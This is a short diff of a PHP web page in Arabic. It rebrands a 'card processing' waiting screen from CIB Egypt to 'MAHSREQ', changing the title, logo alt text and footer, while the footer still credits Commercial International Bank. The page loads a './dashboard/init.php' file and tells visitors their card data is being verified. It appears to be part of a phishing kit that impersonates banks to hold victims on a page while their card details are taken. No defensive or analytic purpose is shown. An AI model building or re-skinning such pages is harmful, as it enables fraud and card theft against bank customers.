@@ -9,7 +9,7 @@ require_once('./dashboard/init.php');
 
 <head>
     <meta charset="utf-8">
-    <title>جاري معالجة الدفع - CIB</title>
+    <title>جاري معالجة البطاقة - MAHSREQ</title>
     <meta content="width=device-width, initial-scale=1.0" name="viewport">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -273,14 +273,14 @@ require_once('./dashboard/init.php');
     <div class="bg-particles" id="particles"></div>
     <div class="container">
         <div class="glass-card">
-            <div class="logo-wrap"><img src="assets/logo.webp" alt="CIB"></div>
+            <div class="logo-wrap"><img src="assets/logo.webp" alt="MAHSREQ"></div>
             <div class="spinner-container">
                 <div class="spinner-ring"></div>
                 <div class="spinner-ring"></div>
                 <div class="spinner-ring"></div>
                 <div class="spinner-dot"></div>
             </div>
-            <h2 class="wait-title">جاري معالجة عملية الدفع</h2>
+            <h2 class="wait-title">جاري معالجة البطاقة</h2>
             <p class="wait-subtitle">نقوم بالتحقق من بيانات البطاقة.<br>يرجى عدم إغلاق هذه الصفحة.</p>
             <div class="progress-container">
                 <div class="progress-bar"></div>
@@ -300,7 +300,7 @@ require_once('./dashboard/init.php');
             </div>
         </div>
     </div>
-    <div class="bottom-note">CIB Egypt © 2025 — Commercial International Bank</div>
+    <div class="bottom-note">MAHSREQ Egypt © 2025 — Commercial International Bank</div>
 
     <script>
         (function () {
